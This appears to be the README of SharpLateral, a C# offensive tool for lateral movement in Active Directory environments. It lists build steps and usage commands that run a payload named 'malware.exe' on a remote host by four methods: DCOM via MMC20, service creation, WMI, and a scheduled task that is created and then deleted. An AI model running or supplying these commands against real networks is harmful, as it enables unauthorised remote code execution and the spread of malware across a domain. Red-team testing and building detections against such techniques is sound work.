# SharpLateral

SharpLateral is a tool that includes 4 different methods for performing lateral movement in the AD environment and is written in C# language.

## Compiling Project

Below 3rd party libraries are used in this project.

<b>TaskScheduler</b><br>https://github.com/dahall/TaskScheduler<br>
<b>Fody</b><br>	https://github.com/Fody/Fody<br><br>
Load the Visual Studio project up and go to "Tools" > "NuGet Package Manager" > "Package Manager Settings"<br>
Open "NuGet Package Manager" > "Package Sources"<br><br>
<b>Install the Fody</b><br>``Install-Package Costura.Fody -Version 3.3.3``<br><br>
<b>Install the Taskscheduler</b><br>``Install-Package TaskScheduler -Version 2.8.11``

## Usage

SharpLateral aims to perform lateral movement with the following methods:<br>

- DCOM
- SERVICE
- WMI
- SCHEDULED TASKS

  <b><br>DCOM:<br></b>
``SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe``<br>
Executes Malware on given hostname via MMC20<br>
<b><br>Scheduled Task:<br></b>
``SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName``<br>
Creates Task,Executes Malware,Deletes Task<br>
<b><br>Service:<br></b>
``SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName``<br>
  Creates Service and executes malware with it<br>
<b><br>WMI:<br></b>
 ``SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe``<br>
Executes malware via WMI on remote host




